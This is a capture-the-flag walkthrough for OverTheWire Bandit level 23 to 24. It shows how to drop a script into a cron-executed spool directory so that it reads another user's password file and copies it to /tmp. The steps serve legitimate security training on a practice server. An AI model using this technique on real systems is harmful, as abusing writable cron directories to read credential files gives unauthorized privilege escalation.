# 🏴 Bandit Level 23 → Level 24 – Using Temporary Directory and Cron Job

---

## 🎯 Level Goal

Write a shell script that will be automatically executed by a cron job and extract the password for `bandit24` to a temporary file.

---

## 🪜 Step-by-Step Instructions

---

### 🔹 Step 1: Create a temporary working directory

```bash
cd /tmp
mkdir bandit_hack
cd bandit_hack
```

---

### 🔹 Step 2: Write the shell script

Create the script file:

```bash
nano myscript.sh
```

📄 Script content:

```bash
#!/bin/bash
cat /etc/bandit_pass/bandit24 > /tmp/password_by_bandit23.txt
```

✅ **Note:**  
You do **not need to manually create the file `/tmp/password_by_bandit23.txt`** beforehand.  
The `cat` command will automatically **create and write to the file** when the script is executed.

Save with `Ctrl + O`, press `Enter`, then exit with `Ctrl + X`.

---

### 🔹 Step 3: Make the script executable

```bash
chmod +x myscript.sh
```

🛠 **Explanation:**  
The `+x` flag grants **execution permission** to the file, allowing the system to run it as a program or script.  
Without `+x`, the script cannot be executed, even if it has valid code.

---

### 🔹 Step 4: Copy the script to the cron-monitored folder

```bash
cp myscript.sh /var/spool/bandit24/foo/
```

✅ The cron job running under `bandit24` will scan the `/var/spool/bandit24/foo/` folder and execute any valid scripts placed there.

---

### 🔹 Step 5: Wait for the cron job to run (approx. 1 minute)

After about 1 minute, check for the output:

```bash
cat /tmp/password_by_bandit23.txt
```

✅ If successful, this file will contain the password for the next level: `bandit24`.

---

## ⚠️ Important Notes

- If you **cannot write to `/var/spool/bandit24/foo/`**, check the folder's permissions:

```bash
ls -ld /var/spool/bandit24/foo
```

- If the directory is not writable or has been used by someone else, you may:
  - **Wait for the OverTheWire server to reset** (it typically resets every few hours).
  - **Prepare your script in advance** in another location and **quickly copy it in** when write access becomes available.

---

## 🧭 Logging into the next level

Once you’ve obtained the password:

```bash
ssh bandit24@bandit.labs.overthewire.org -p 2220
```

---

✅ That’s it! You’ve successfully completed **Bandit Level 23 → Level 24** using a cron-executed shell script.
